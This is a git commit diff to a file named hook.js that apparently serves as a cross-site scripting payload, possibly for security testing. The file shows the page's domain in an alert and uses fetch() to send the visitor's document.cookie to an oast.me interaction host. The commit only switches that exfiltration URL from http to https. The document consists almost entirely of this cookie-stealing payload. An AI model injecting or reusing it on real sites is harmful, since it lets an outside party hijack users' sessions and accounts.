98688b0676754e4201a535343702a9a53f99762a
sinarpagi <88878210+sinarpagi@users.noreply.github.com>
2025-06-28 21:52:40 +0700

    Update hook.js

--- hook.js
+++ hook.js
@@ -1,2 +1,2 @@
 alert(document.domain);
-fetch('http://d1fvudvuei98fi0t2ch089oatn5cbaf8b.oast.me/?cookie=' + document.cookie);
+fetch('https://d1fvudvuei98fi0t2ch089oatn5cbaf8b.oast.me/?cookie=' + document.cookie);
